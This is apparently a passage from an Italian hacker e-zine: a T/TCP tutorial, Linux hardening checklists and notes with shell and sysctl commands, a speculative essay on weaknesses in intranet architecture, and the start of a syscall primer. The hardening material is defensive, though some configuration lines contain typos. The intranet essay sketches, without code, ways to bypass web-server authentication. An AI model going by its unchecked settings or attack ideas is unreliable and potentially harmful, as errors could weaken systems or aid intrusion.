l'operatività, i vantaggi e i difetti del T/TCP. ok?

Dunque ragazzi, bisogna precisare che T/TCP può essere considerato come una estensione
del protocollo TCP. La ragione è nel fatto che il  T/TCP è stato realizzato per
funzionare in congiunzione con le attuali macchine TCP. Se una macchina TCP prova a
connettersi ad una macchina T/TCP, la macchina  T/TCP risponderà con l'originale
TCP 3-way handshake ok? direi che fin ora è abbastanza semplice! spero siate d'accordo
con me :) Dunque ragazzi ho da porvi una domanda, sapete cosa sia una transazione?
Il termine transazione si riferisce ad una richiesta inviata da un cliente ad un
server insieme alla risposta del server... tutto qui!!
Detto questo vorrei ricordarvi che l'allargarsi di internet  ha messo un vincolo sulla
larghezza di banda e sulla velocità delle reti. Con più utenti che mai, la necessità
di una più efficiente forma di trasferimento dati è sentita...Il numero assoluto minimo
di pacchetti necessari per una transazione sono due: una richiesta seguita da una
risposta. UDP è il protocollo nello stak dei protocolli TCP/IP che permette questa
operazione, il problema diventa l'insicurezza della trasmissione... indovinate un pò
dov'è la soluzione del problema? hihiih bravi avete indovinato T/TCP risolve il problema
in maniera molto ampia. Ha l'affidabilità del TCP ed è molto vicino al realizzare lo
scambio di due pacchetti. T/TCP usa il modello del TCP per la tempificazione delle
transazioni, introducendo un nuovo concetto al fine di permettere la riduzione
dei pacchetti... capito niente? Inoltre, anche se i pacchetti sono inviati utilizzando
il T/TCP, i dati sono trasportati nei primi due; cosi, l'applicazione puo vedere i dati
alla stessa velocità del protocollo UDP. Il terzo pacchetto è la conferma del client
al server del ricevimento dei dati, che incorpora l'affidabilità del TCP.
Tutto qui... penso che questa breve introduzione sia servita per farvi capire un pò
la funzionalità del protocollo t\tcp :) detto questo direi di poter passare ad
analizzare le operazioni di base, che ne dite? ve la sentite? direi proprio di si hihih
forza a lavoro!!
Dunque per farvi un banale esempio consideriamo un sistema  DNS, sul quale un cliente
invia una richiesta ad un server e si aspetta un piccolo contenuto informativo di
ritorno dal server. Tuttavia con il  TCP sono associati la trasmissione di tre
pacchetti con lo stabilirsi della sola transazione, un totale di tre pacchetti
trasmessi è associata con lo stesso processo un risparmio del  66% di  pacchetti
trasferiti comparato al TCP. Ovviamente, nel caso in cui sia trasferito un notevole
numero di dati, sono trasferiti più pacchetti di dati, risultando in una diminuzione
della percentuale di risparmio ma il tutto naturalmente dipende anche dalla velocità
del PC! ok? Naturalmente per limitare il numero di pacchetti da inviare al server
questi furbacchioni hanno trovato altre soluzioni... quali? guardate un pò... Il TCP
Accelerated Open (TAO) è un meccanismo introdotto dal  T/TCP che ha lo scopo di
diminuire il numero di pacchetti necessari allo stabilimento della connessione con un
sistema! furbi vero? Ma attenzione T/TCP introduce un certo  numero di nuove opzioni.
Queste opzioni permetto di stabilire la connessione con un sistema utilizzando il TAO.
T/TCP usa un numero di avvio a 32-bit, indicato come contatore di connessione (CC)
mi seguite fin qui? bene! dunque penso che sappiate che ciascun sistema server conserva
in memoria (o in un file) l'ultimo numero valido di CC ricevuto da ciascun sistema
client. Questo valore di CC viene settato con segmento di SYN verso il server. Se il
valore iniziale di CC per un particolare client e più grande del valore conservato, la
proprietà del opzione CC (il numero incrementato) assicura che il segmento SYN è nuovo
e può essere accettato immediatamente, allora, Il controllo del TAO non viene accettato
se l'opzione del CC in arrivo nel segmento  SYN  è più piccolo del valore conservato
dal sistema o se l'opzione CCnew viene inviata! Capito?
Un altro dato da analizzare, naturalmente è il troncamento del TIME-WAIT ... Lo stato
di TIME-WAIT è uno stato in cui il tutte le connessioni  terminano quando la
connessione viene chiusa. Il tempo di durata di questo stato è di  240 secondi per
permettere ad ogni segmento ancora nella rete relativo alla connessione precedente di
terminare. L'introduzione del opzione CC nel T/TCP permette il troncamento dello stato
di TIME-WAIT!! Ci siamo? Allora... come voi sapete (o almeno spero hihihi) il Hypertext
Transfer Protocol è il protocollo usato dal World Wide Web per leggere le pagine web.
Il numero di andate e ritorno usate da questo protocollo sono più del necessario.
T/TCP può essere utilizzato per ridurre il numero di pacchetti necessari... in pratica
HTTP è una applicazione transazionale classica. Il client invia al server una breve
sequenza di richieste in cui chiede un documento o una immagine e quindi chiude la
connessione. Il server quindi invia le informazioni al client. Il T/TCP può essere
utile per migliorare questo processo e diminuire il numero di pacchetti inviati sulla
rete... tutto qui! Ragazzi mi sembra che il discorso fin ora sia abbastanza semplice
da capire, giusto? quindi direi di poter continuare... allora, il Domain Name System
viene usato per tradurre il nome del sistema nel corrispondete indirizzo usato per
trovare il sistema. Per tradurre il nome del dominio, il cliente invia al server una
richiesta con l'indirizzi di IP o il nome del sistema.  Il server invia il nome del
sistema o l'indirizzo di IP se appropriato ... Questo protocollo usa UDP come processo
sottostante.Ma come sempre c'è la pecca... Come risultato del utilizzo dell'UDP, il
processo è veloce ma non affidabile. In aggiunta, se la risposta del server supera i
512 bytes di dati, il server invia i dati al cliente con i primi 512 bytes e aggiunge
un flag di troncamento e come al solito, indovinate qual'è la soluzione? hihihi ragazzi
sembrerà una barzelletta ma invece è proprio così il T/TCP è il perfetto candidato per
il protocollo DNS, per la sua velocità e sicurezza.
So che in mente di tutti è balenata una sfida ... Prestazioni del T/TCP a confronto dei
miglioramenti del HTTP e direi che qui c'è un bel pò da dire!!Addirittura non so da
dove cominciare, diciamo che attualmente, il protocollo HTTP si trova nel livello di
applicazione all'interno del modello di riferimento del TCP/IP. Usa il protocollo TCP
per eseguire tutte le sue operazioni, l'UDP diviene troppo inaffidabile. Esiste molto
tempo di latenza nel trasferimento delle informazioni... inoltre diciamo che al momento
tutte le pagine web sono trasferite in maniera testuale non compressa, richiedendo un
piccolo impegno sia del server che del cliente per la visualizzazione ma al fine di
inserire la compressione nel protocollo HTTP, un certo numero di vincoli che non sto
qui a citare, devono essere risolti... insomma ragazzi il T\TCP può essere di beneficio,
o almeno, può migliorare il protocollo HTTP, questo è sicuro! Chiarito anche questo
piccolo problemino rimangono poche cose da dire... in primo luogo che la programmazione
del T/TCP è leggermente differente dal uso della programmazione dei soket. Per rendervi
più chiare le idee vi porto questi due esempi :

La catena di una chiama sistema per costruire un cliente TCP potrebbe essere come la
seguente:
·	socket(): crea il socket
·	connect(): si connette al sistema remoto
·	write(): scrive i dati sul sistema remoto
·	shutdown(): chiude un lato della connessione

Invece con il  T/TCP la catena dei comandi diviene:
·	socket(): crea il socket
·	sendto(): si connette, invia i dati e chiude la connessione

Meglio vero? direi proprio di si... in pratica questo è tutto quanto c'è da dire sul
protocollo t\tcp
Beh ragazzi che dirvi, mi ha fatto molto piacere scrivere questo tutorial e spero che
anche voi lo leggiate con piacere, mi faccio gli auguri di buona fortuna da solo per
sperare che questo tutorial vada bene e che mi permetta di divenare membro di noflyzone
Ciao a tutti ... vi aspetto al prossimo tutorial (o almeno spero)
Cyberdude

------------------------------------<END>--------------------------------------

-------------------------------------<20>--------------------------------------
-----------------------------------<goony>-------------------------------------
-------------------------------<Linux Box sicura>------------------------------



  Installazione Box Linux Sicura                                     goony@OpenBEER.it
  ------------------------------                                     http://goony.tzone.it


 1- Fase iniziale

    1.1 Sicurezza fisica

        . scegliere un luogo sicuro, riservato, protetto (apposite serrature ecc.)
        . controllare temperatura stanza
        . controllare cablaggio
        . controllare la presenza di UPS o batterie supplementari
        . scelta di un case con apposite chiavette
        . controllare la presenza di ventole di raffreddamento
        . controllare la presenza di blocchi per i cd e floppy disck
        . controllare la presenza di blocchi per connettori  corrente
        . controllare la presenza di periferiche non protette (monitor, tastiera, mouse ecc.)

    1.2 Preparare elenco hardware a disposizione

        . dischi
        . ram
        . controller scsi/raid array
        . mouse e n. bottoni
        . scheda video
        . monitor
        . schede di rete
        . ip + dns + gateway (oppure dhcp)
        . host + domain name
        . esaminare la possibilità di strumenti di backup

    1.3 BIOS

        . verificare l'ora e la data di sistema direttamente nel BIOS
        . verificare la presenza della password del BIOS
        . disabilitare avvio per mezzo di floppy e cdrom

    1.4 Partizioni e dimensioni

        . dipende dall'hd a disposizione e dall'obbiettivo
        . utile creare più partizioni per le directory più importanti (sicurezza/prestazioni)
        . utile creare una partizione /chroot, /cache e /backup

    1.5 Software

        . installazione personalizzata


 2- Dopo installazione

    2.1 Permessi

        . controllare i permessi e configurazione del boot loader
        . controllare i permessi del file /etc/inittab
        . controllare i permessi del file /etc/inittab e le sue voci
        . controllare i permessi dei comandi di riavvio e halt del sistema
        . impedire il riavvio del sistema mediante la combinazione di tasti [Ctrl+Alt+Canc] commentare la riga
          contenente ctrlaltcanc nel file /etc/inittab

    2.2 Utenti

        . eliminare gli utenti inutilizzati
        . controllare permessi, shell e home dir degli utenti
        . controllo password semplici
        . controllo del path
        . vietare l'utilizzo di più console
        . vietare l'utilizzo di risorse (quote/limit)

    2.3 Servizi di rete

        . eliminare i servizi di rete insicuri e/o inutilizzati
        . settare permessi sulle connessioni di rete (firewall, tcpwrappers ecc.)
        . utilizzo di servizi in filesystem in chroot

    2.4 Software

        . utilizzare e poi eliminare software insicuro e/o inutilizzato (programmi di conf., compilatori, sorgenti ecc.)
        . aggiornamento software (cvs, swup ecc.)

    2.5 Banner

        . controllare i banner in fase di login

          . rc.local
          . motd
          . redhat-release

        . controllare i banner dei servizi di rete

          . telnet
          . ssh
          . apache
          . ftp

        . controllare la presenza di un clear dopo la fase di logout
        . eliminare l'utilizzo dell'history dei comandi
        . settare "mesg" a NO

    2.6 Kernel

        . ricompilazione del kernel
        . utilizzo di supporti per la sicurezza (Openwall, Angel)
        . utilizzo delle patch
        . eliminare sorgenti, compilatori ecc. (make, gcc, patch ecc.)

    2.6 Altro

        . accuratezza dei file di logs
        . utilizzo di scritp/software per il backup


 3- Opzioni di sicurezza

    3.1 Utilizzo di firewall

        . ipchains
        . iptables

    3.2 Utilizzo di ids (intrusion detection system)

        . snort
        . portsentry
        . altri

    3.3 Utilizzo di software sicuro

        . ssh per connessioni remote
        . supporto ssl per il server web, mail
        . pgp/gnupg per l'utilizzo della posta elettronica
        . software il filesystem crittografato
        . collegamenti/tunnel crittografati (ssh, vpn, ipsec)

    3.4 Altro

        . utilizzo di arp table statiche
        . software per la gestione dei logs

 4- Controllo sicurezza

    . utilizzo di ip/ports scanner
    . utilizzo di security scanner
    . utilizzo di software per il controllo delle rules del firewall
    . sniffer di rete


 ----------------------------------------------------
 Autore    : goony
 Data      : marzo 2002
 Email     : goony@OpenBEER.it
 Gnupg key : http://www.OpenBEER.it/keys/goony.asc
 Sito      : http://goony.tzone.it
 ----------------------------------------------------

------------------------------------<END>--------------------------------------

-------------------------------------<21>--------------------------------------
---------------------------------<Cyberdude>-----------------------------------
---------------------------------<Intranet>------------------------------------

Cos'è Intranet? é possibile hackerare intranet? queste sono solo due delle
domande più ripetutemi da JomiCHEgaN una sera che stavamo nel centro SNAI a
giocare una scommessa sportiva!! Jo mi chiedeva di aiutarlo, beh amico mio
spero che con questo tutorial potrai imparare a fare da solo quanto mi
chiedevi ok?

Salve a tutti... premetto che questa intro può rivelarsi un pò pallosa per
i tipi a cui interessa sapere solo l'argomento e molto interessante per
coloro che invece sono interessati anche all'autore e al suo stato d'animo
quando ha scritto il suo tutorial, quindi lascio a voi la scelta se leggere
o meno l'introduzione, altrimenti saltate direttamente al vero e proprio
tutorial :)
Ebbe tutto inizio una bella serata di fine aprile quando cyberdude dopo un
interessante colloquio con BrNoCrIsT e BigAlex aveva deciso di scrivere un
tutorial su intranet...nella testa aveva la canzone del grande Vasco Rossi
Ti voglio bene, la luna lo accompagnava nel suo studio e soprattutto, il
pensiero fantastico della partenza per 4 giorni di mare all'indomani lo
rendeva praticamente il ragazzo più felice al mondo!! Volete sapere qual'è
il colmo della faccenda? Cyberdude non sapeva un ca--o per quanto riguarda
il concetto di intranet a parte il fatto che è simile a internet (o almeno
credo) hihihihihi!! Vabbè ragazzi, insomma dopo questa ridicolissima intro
direi che mi sembra il caso di metterci con la testa e con il pensiero a
fare un pò le persone serie e a metterci a studiare... anzi no vorrei
aggiungere altre cose che ora mi balzano in mente... le mie considerazioni
al momento riguardo questo tutorial!! Prima ancora di iniziare a scrivere
penso che sto tutorial farà una grande riuscita perché stasera mi sento in
grande spolvero per scrivere ... l'atmosfera è perfetta,lascio immaginare:
Sto seduto avanti al mio Pc in veranda al secondo piano, la luna e tutte le
stelle decorano il cielo, io tra le piante avvolta nell'ombra e la musica
che mi consola, alla luce di una lampada in questo "paesaggio" giamaicano
mi accingo a scrivere questo tutorial, isolato dal mondo stressato e nervoso
Wow che bello... so che un giorno rileggendo il tutto mi verrà una tale
nostalgia di questi giorni :)
Vabbè basta davvero adesso!! iniziamo a parlare di intranet!! :)

(fammi ancora un'intro così lunga e te la sego via:)) n.d.CH)
_______________________________
InTrAnEt tUtOrIaL bY CyBeRdUdE
_______________________________

Allora, la prima domanda che ci può balenare alla mente riguardo intranet è
la seguente : Cosa è e a cosa serve una Intranet ?
Intranet è l'applicazione che consente la condivisione e lo scambio delle
informazioni di un'azienda o di un gruppo di aziende fra di loro collegate
mediante lo strumento di Internet e del World Wide Web. Con essa si
ottimizzano i processi di comunicazione garantendo al contempo un accesso
riservato alle informazioni stesse. La Intranet è una rete informativa che
collega i dipendenti aziendali, mette a disposizione informazioni ai .
partner esterni ed ai clienti, rendendo il lavoro più produttivo, le
informazioni più accessibili e la ricerca di risorse aziendali e/o
applicazioni molto più semplice... e direi che questa semplice spiegazione
sia accessibile anche alle scimmie!! ok? Intranet, è un sistema interno ad
un&#8217; azienda riservato, che può tuttavia sfruttare la risorsa Internet per
creare dei collegamenti esterni che consentano operazioni di marketing,
comunicazione e campagne di vendita via Web. L'accesso alla Intranet può
avvenire tramite Internet (con una userID e una Password): in base alla
tipologia di utente che si collega (amministratore, contabile, fornitore,
cliente, distributore...), le operazioni eseguibili e le informazioni
accessibili ad esso cambiano in modo dinamico. Un amministratore avrà
accesso ad un numero di informazioni e funzioni decisamente superiore ad
un fornitore, ma sinceramente questi sono ca--i suoi ihihihihihi :) ...
inoltre, Intranet ha delle interfacce WWW che consentono di interrogare i
database!! Direi di aver risposto in modo abbastanza adeguato alla prima
domanda no? beh se la pensate diversamente... non so che dirvi hhhihihihi
... allora, continuiamo,una cosa che invece mi interessa di più e che spero
interessi sapere anche a voi è la faccenda che riguarda la sicurezza e
riservatezza dei dati, mi spiego meglio!! Insomma... potrebbe essere un
problema , come dire, essere sicuri di nascondere i dati, tali problemi
sono risolte proteggendo la rete Intranet con sistemi Firewall che
permettono di limitare l'accesso dall'esterno ai computers dedicati alla
pubblicazione e sistemi di codifica di accesso e crittografia che
impediscano l'accesso alle zone riservate da parte di persone non
autorizzate...
Il lato, più che positivo della faccenda, è il fatto che una rete Intranet
permette di evitare di porsi problemi quali la scelta dell'hardware o del
sistema operativo per gli utenti che si collegano, in quanto qualunque
computer è in grado di collegarsi e scambiare informazioni con gli standard
Internet. La cosa importante da capire è soprattutto il fatto che (leggete
bene quel che scrivo adesso) non ci sono limiti geografici ad una Intranet!!
Capitoooo? In pratica ... riassumiamo tutto quello detto nei righi sopra
riportati con questo schemino :
Intranet - Una rete ad accesso ristretto che funziona come Web, ma non si
           trova su Web. Generalmente posseduta e gestita da un'azienda,
           una rete Intranet permette a una società di condividere le sue
           risorse con i suoi impiegati, senza rendere disponibili le
           informazioni confidenziali a tutti gli utenti che dispongono di
           un accesso a Internet.
Oh almeno questo è quanto dicono tutti, compresa la persona che mi ha detto
di intranet per scrivere questo tutorial... ma io avrei alcune mie idee
riguardo l'intranet che non credo tutti abbiano!! Le vogliamo vedere ?
Perché no!!

Adesso se permettete, aggiungo a queste poche conoscenze, le mie idee
riguardo questo Intranet ok? Spesso le ragioni dello sviluppo di un portale
aziendale Intranet risiedono in motivi di immagine aziendale piu' che di
funzionalità, con il risultato di sottovalutare le problematiche relative
alla sicurezza. L&#8217;introduzione di un firewall, macchina dedicata al
controllo e filtraggio delle connessioni, tra la rete aziendale e Internet
e' considerata la soluzione a tutte le problematiche di protezione, o almeno
così la vedo io!! Per quanto io ne sappia ragazzi, nei sistemi Intranet, la
tecnologia utilizzata e' la medesima di Internet; questo significa che un
&#8216;buco di sicurezza&#8217; nel sistema potrebbe equivalere alla pubblicazione su
rete pubblica di documenti e informazioni riservate... ho torto? se è così
vi prego di mandarmi 1 mail e di farmelo sapere!! Comunque, continuo con le
mie considerazioni... Non e' inoltre da sottovalutare il fatto che le
persone in grado di portare attacchi su reti basate su protocollo TCP/IP
sono molto più numerose rispetto a coloro che sono in grado di attaccare
i protocolli precedenti, siete o no del mio stesso parere? Essendo Internet
una rete aperta, gli attacchi possono quindi provenire da qualsiasi computer
connesso alla Rete quindi, direi che la presenza di un firewall risolve solo
alcune delle situazioni di rischio a cui un&#8217;azienda con un&#8217;applicazione
Intranet e' esposta!!Aggiungo dicendo che il firewall inoltre non protegge
dai possibili attacchi provenienti dall&#8217;interno della rete LAN (Local Area
Network)... adesso voi direte, ma questo dove vuole arrivare? beh concludo
subito :In un sistema costruito su Intranet, ogni servizio specialistico
potrebbe essere basato su un proprio Web server e application server. Il
Web server si prende carico di gestire la connessione dell&#8217;utente e di
dialogare con l&#8217;application server che elabora e fornisce i dati richiesti.
Se l&#8217;autenticazione dell&#8217;utente viene demandata al Web server, un attacco
potrebbe essere portato a termine semplicemente scavalcandolo e tentando di
collegarsi direttamente all&#8217;application server che così fornirebbe tutte
le informazioni richieste... e allora, scusate, ma dov'è tutta la sicurezza
di intranet? Mah se il mio ragionamento è corretto il non dovrebbe essere
poi così difficile attaccare con successo una rete intranet!! Ma è molto
probabile che mi sbagli, dato che le mie conoscenze riguardo all'argomento
sono molto approssimative!! ok non perdiamo altro tempo con inutili parole!
Parliamo d'altro ok? Vediamo un pò per quanto riguarda la protezione dei
server sulla rete... Dunque ragazzi, affrontando un progetto per la
realizzazione di un servizio basato su tecnologia Intranet, sono di
primaria importanza l&#8217;analisi della riservatezza delle informazioni
trattate e l&#8217;identificazione di quale sia il corretto livello di sicurezza
da realizzare.Contrariamente a quanto potrebbe sembrare, la protezione
della rete da accessi esterni di utenti non autorizzati alla rete locale
e' il problema di più facile soluzione. Esistono sul mercato molteplici
soluzioni di firewall in grado di separare efficacemente la rete interna
da Internet ma diversa e' la situazione se gli attacchi provengono dalla
rete interna ok? e questo a confermare la mia tesi !! vabbè lasciamo perdere
adesso questo discorso e analizziamo meglio intranet nella sua struttura,
la tipica architettura di un sistema Intranet prevede la presenza di tre
componenti distinti: il server Web, l&#8217;application server e il server dei
dati. Il Web server si occupa di accettare e gestire le connessioni degli
utenti e di interrogare l&#8217;application server. L&#8217;application server e' la
macchina che effettua le funzioni logiche sui dati e presenta all&#8217;utente,
tramite il Web server, i risultati delle operazioni effettuate. Il server
dei dati e' spesso costituito da un database e rappresenta il repository in
cui i dati sono contenuti.Seguitemi adesso che viene la parte che vi piace
hhihihi ... Spesso le macchine che svolgono le tre funzioni sono collegate
alla stessa rete locale e raggiungibili da tutti i client del sistema; in
questo caso e' essenziale proteggere dagli accessi non autorizzati tutti e
tre i livelli del sistema. Infatti se l&#8217;autenticazione dell&#8217;utente venisse
demandata al solo Web server, sarebbe possibile per un malintenzionato
tentare una connessione diretta con l&#8217;application server o, peggio, con il
repository delle informazioni e scavalcare l&#8217;infrastruttura di sicurezza
prevista. Anche nel caso di un efficace sistema di protezione degli accessi
e' sempre possibile, con appositi programmi, analizzare il traffico di rete
generato tra i tre livelli del sistema e cercare di filtrare le informazioni
di interesse. Ragazzi, in pratica ogni protezione fisica risulta inutile se
una persona non autorizzata riesce a ottenere l&#8217;accesso al sistema
spacciandosi per qualcun altro!!Ma state attenti se per il controllo
centralizzato degli utenti ci sono i directory server con protocollo LDAP
(Lightweight Directory Access Protocol) e quelli basati su tecnologia
Microsoft Windows NT... Tramite l&#8217;utilizzo di un directory server e'
possibile realizzare un sistema di profiling degli utenti, ossia indicare
per ogni utente a quali servizi può accedere e quali funzioni può
attivare; la combinazione di una netfarm con un servizio di autenticazione
centralizzato, spesso situato sul firewall che protegge la netfarm stessa,
e' una soluzione molto utilizzata che unisce un buon livello di sicurezza
e controllo a costi interessanti.

------=[ 3 GIORNI DOPO L'INIZIO DEL TUTORIAL ]=-----
Bene bene ... è finito, naturalmente adesso è il momento di dedicare sto
tutorial a qualcuno, in prima persona a JomiCHEgaN che mi ha dato lo stimolo
per studiarmi tutta la struttura e i vari metodi per hackerare intranet
(cosa che serve per i cazzi suoi hihihiih ) ... poi lo dedico a BrNoCrIsT
che mi ha dato la brillante idea di scriverne un tutorial e poi naturalmente
lo dedico a tutti coloro che leggono questo e gli altri miei tutorial :)


------------------------------------<END>--------------------------------------

-------------------------------------<22>--------------------------------------
------------------------------------<goony>------------------------------------
----------------------------<Appunti Sicurezza Linux>--------------------------



  Appunti Sicurezza Linux
    -----------------------

 - controllare i permessi del file /etc/fstab

           user = solamente l'utente che ha montato un filesystem può smontarlo;
                            permette ad un utente normale di montare il file system.
                            Questa opzione implica anche le opzioni noexec, nosuid, e nodev
                            (finché  ciò non sia cambiato dal superuser usando, ad
                            esempio, la seguente riga di opzioni: user,exec,dev,suid)
           users = tutti gli utenti hanno la possibilità di smontare
           quiet = abilita il flag quiet. Tentativi di chown o chmod su file non restituiscono errori,
                   sebbene falliscano.
           umask = valore; imposta  l'umask; il valore va dato in ottale.

 - controllare i permessi dei comandi di riavvio e halt del sistema:

          . creare il file /etc/halt.users e aggiungere due righe ai file /etc/pam.d/halt e
            /etc/pam.d/shutdown in modo che risultino così:

            #%PAM-1.0
            auth       sufficient   /lib/security/pam_rootok.so
            auth       requisite    /lib/security/pam_listfile.so \
                       onerr=3Dfail sense=allow item=user file=/etc/halt.users
            auth       required     /lib/security/pam_console.so
            auth       required     /lib/security/pam_pwdb.so
            account    required     /lib/security/pam_permit.so

            in questa maniera solo gli utenti menzionati in /etc/halt.users possono utilizzare halt e shutdown

 - controllo permessi e configurazione del boot-loader

   . utilizzare la direttiva "password"
   . utilizzare la direttiva "password" = LILO chiederà la password ogni volta che si cercherà di fornirgli degli argomenti

 - eliminare software insicuro e inutilizzato

   . per mezzo del comando rpm con le diverse opzioni

   . usare i programmi di configurazione e poi eliminarli:

     rpm -e kbdconfig mouseconfig timeconfig authconfig ntsysv setuptool

   . eliminare anche sendmail, da reinstallare dopo

     rpm -e sendmail

 - eliminare i banner

   . rc.local
   . motd
   . issue
   . redhat-release

 - Timeout su accesso root

   . in /etc/profile ~/.profile aggiungere TMOUT=7200

 - Lunghezza minima password

   . in /etc/login.defs aggiungere PASS_MIN_LEN da 5 a 8

 - Disabilitare pgm console agli utenti
   (se installato xserver)

   . rm -f /etc/security/console.apps/halt
   . rm -f /etc/security/console.apps/poweroff
   . rm -f /etc/security/console.apps/shutdown
   . rm -f /etc/security/console.apps/xserver

 - TCP wrapper

   . contenuto di /etc/hosts.deny

     # access is denied by default
     # deny access to everyone
     ALL:ALL, PARANOID

   . contenuto di /etc/hosts.allow:
     sshd: 192.168.1.10 matteo

   . tcpdchk

 - Eliminare il prompt del login

   . aggiungere -h alla linea di telnet nel file /etc/inetd

     telnet stream tcp nowait root /usr/sbintcpd in.telnetd.-h

 - Bloccare modifiche a files

   . chattr +i /etc/services

 - Accesso di root solo da tty1

   . indicare nel file /etc/securetty solo i devices dov'e' ammesso login di root (es. solo tty1),
   #disabilitare le altre linee


 - Eliminare utenti e gruppi inutili

   userdel adm
   userdel lp
   userdel sync
   userdel shutdown
   userdel halt
   userdel news
   userdel uucp
   userdel operator
   userdel games # se non usi xwindow
   userdel gopher
   userdel ftp # per ftp anonimo
   groupdel adm
   groupdel lp
   groupdel news
   groupdel uucp
   groupdel games # se non usi xwindow
   groupdel dip
   groupdel pppusers
   groupdel popusers # se non usi pop server per l'email
   groupdel slipusers

   . magari spostare i chattr+i tutti insieme alla fine

   chattr +i /etc/passwd
   chattr +i /etc/shadow
   chattr +i /etc/group
   chattr +i /etc/gshadow

 - Controllo sui filesystem montati

   nel file /etc/fstab aggiungere a defaults anche ,rw,nosuid,nodev ed eventualmente
   anche ,noexec (es. per la partizione dov'e' montato /tmp)

 - Eliminare il programma RPM

   spostandolo su un floppy disk oppure rendere disponibile il file solo a root

   chmod 700 /bin/rpm

 - Command history

   . ridurre il numero di comandi che rimangono memorizzati nella bash history

     nel file /etc/profile cambiare testo in:
     HISTFILESIZE=20
     HISTSIZE=20
     e sistemare anche la riga con EXPORT

   . eliminare history dopo il logout

     per i nuovi utenti il file template e' /etc/skel/.bash_logout
     inserire la linea:
     rm -f $HOME/.bash_history
     per gli utenti gia' esistenti modificare il file ~/.bash_logout

 - Controllo del PATH

   eliminare "."


 - Permessi

   es. mkdir prova
       chmod 777 prova
       con utente goony creare il file ciao con permessi 600
       con utente goony1 fare cat ciao
       con utente goony1 fare rm -rf ciao

   . utilizzare "chmod +t prova" per far si che un utente possa cancellare solo i suoi file

   . utilizzare umask: i più permissivi: 666 per i file e 777 per le dir
     settarlo nel profile

 - Sistemare LILO

   . aggiungere nel file /etc/lilo.conf

     timeout=00
     restricted
     password={password}

     ed eseguire poi

     chmod 600 /etc/lilo.conf
     /sbin/lilo -v
     chattr +i /etc/lilo.conf

 - Files di inizializzazione accessibili solo da root

   i files in /etc/rc.d/init.d
   chmod -R 700 /etc/rc.d/init.d/

 - Elenco dei programmi SUID

   find / -type f \( -perm 04000 -o -perm -02000 \) \-exec ls -lg {} \;

   . eliminare bit SUID dai seguenti programmi:

     chmod a-s /usr/bin/chage
     chmod a-s /usr/bin/gpasswd
     chmod a-s /usr/bin/wall
     chmod a-s /usr/bin/chfn
     chmod a-s /usr/bin/chsh
     chmod a-s /usr/bin/newgrp
     chmod a-s /usr/bin/write
     chmod a-s /usr/sbin/usernetctl
     chmod a-s /usr/sbin/traceroute
     chmod a-s /bin/mount
     chmod a-s /bin/umount
     chmod a-s /bin/ping
     chmod a-s /sbin/netreport

 - Parametri del kernel

   . aggiungere nel file /etc/sysctl.conf

     ### non risponde a ping request
     net.ipv4.icmp_echo_ignore_all = 1

     ### non risponde a ping broadcast
     net.ipv4.icmp_echo_broacasts = 1

     ### disab source routing ip
     net.ipv4.conf.all.accept_source_route = 0

     ### abilita protez da tcp syn cookie
     ### (config_syn_cookies = Y compilaz kernel)
     net.ipv4.tcp_syncookies = 1

     ### disab ICMP redirect accept
     net.ipv4.conf.all.accept_redirects = 0

     ### abil protez da always-defrag
     net.ipv4.ip_always_defrag = 1

     ### disab msg errore in rete
     net.ipv4.icmp_bogus_error_responses = 1

     ### protez ip spoofing
     net.ipv4.conf.all.rp_filter = 1

     ### log pacchetti spoofed,source routed, redirect
     net.ipv4.conf.all.log_martians

 - Aumentare il numero di connessioni tramite /etc/sysctl.conf

   . diminuendo il tempo di default

     # diminuisce il tempo di default per tcp_fin_timeout
     net.ipv4.tcp_fin_timeout=30

     # diminuisce il tempo di default per keepalive connection
     net.ipv4.tcp_keepalive_time=1800

     # spegne window scaling
     net.ipv4.tcp_window_scaling=0

     # spegne tcp sack
     net.ipv4.tcp_sack=0

     # spegne tcp_timestamps
     net.ipv4.tcp_timestamps=0

     # modifica range porte ip
     net.ipv4.ip_local_port_range= 32768 61000


 - Applicazione della patch OpenWall (www.openwall.com)

   muovere il file linux-...-ow2_tar.gz /usr/src
   cd /usr/src
   tar xzvfp linux-...-ow2_tar.gz
   cd linux-...ow2
   mv linux-...ow2.diff /usr/src
   patch -p0 <linux-...-ow2.diff
   rm -rf linux-2....
   rm -f linux-2.2....diff
   rm -f linux..-ow2_tar.gz
   selezionare "Security options" nel .config

 - Limit

   . ulimit (i comandi ulimit sono posti di solito in /etc/profile)

     -a  displays all limits
     -c  maximum core file size
     -d  maximum size of a process's data segment
     -f  maximum size of file created by the shell
     -m  maximum resident set size
     -s  maximum stack size
     -t  maximum amount of CPU time in seconds
     -p  pipe size
     -n  maximum number of open files
     -u  maximum number of process
     -v  maximum amount of vitual memory

  in /etc/security/limts.conf per settare questi comandi in base a gruppi di utenti

 - utilizzare md5

 - arp tables static

  in /etc/ethers:

   77:77:77:77:77:77 192.168.2.10

 - syn countermeasure

   /proc/sys/net/ipv4/vs/timeout_synack   (100)
   /proc/sys/net/ipv4/vs/timeout_synrecv  (10)
   /proc/sys/net/ipv4/tcp_max_syn_backlog (128)

   sotto attacco syn incrementare il valore di tcp_max_syn_backlog e decrementare
   il valore dei timeout_*

   #!/bin/sh
   while [ 1 ]; do
     echo -n "half-open connections; "
     netstat -nat | grep SYN_RECV | wc -l
     sleep 1;
   done



  ---------------------------------------------------
  Autore:       goony
  Dara:         marzo 2002
  Email:        goony@OpenBEER.it
  GnuPG PubKey: http://www.OpenBEER.it/keys/goony.asc
  Sito:         http://goony.tzone.it
                http://www.OpenBEER.it
  ---------------------------------------------------

------------------------------------<END>--------------------------------------

-------------------------------------<23>--------------------------------------
---------------------------------<kernel2418>----------------------------------
---------------------------<Intro alle API in Linux>---------------------------

Introduzione alla Api di Linux
1° parte

Introduzione
Lo scopo di un sistema operativo è quello di creare una macchina virtuale sulla
quale girano i programmi, Linux non è da meno, anzi. In tutto l'articolo utilizzerò
indifferentemente os, so o sistema operativo. Tutti gli os hanno delle chiamate di
sistema, queste si chiamano API o syscall. Linux riguardo alle API osserva lo
standard POSIX che descrive tutte le direttive che deve avere come minimo un os.
 L'elenco delle API di Linux lo si può trovare nella cartella /usr/src/linux/arch/asm/unistd.h
 ipotizzando che nalla cartella linux ci siano i sorgenti del kernel. Iniziamo a
 vedere in pratica le sys_call. Ipotizzo che si conosca almeno un pò di C e che si
 sappiano le basi di utilizzo di linux. Bene inziamo.
In tutti i programma che usano le sys_call si dovrà inserire come minimo la unistd.h,
per informazioni più specifiche usare il man.

Funzioni per la data e l'ora

Bene leggendo il manuale di linux ci accorgiamo che il suo orologio è chiamato spesso
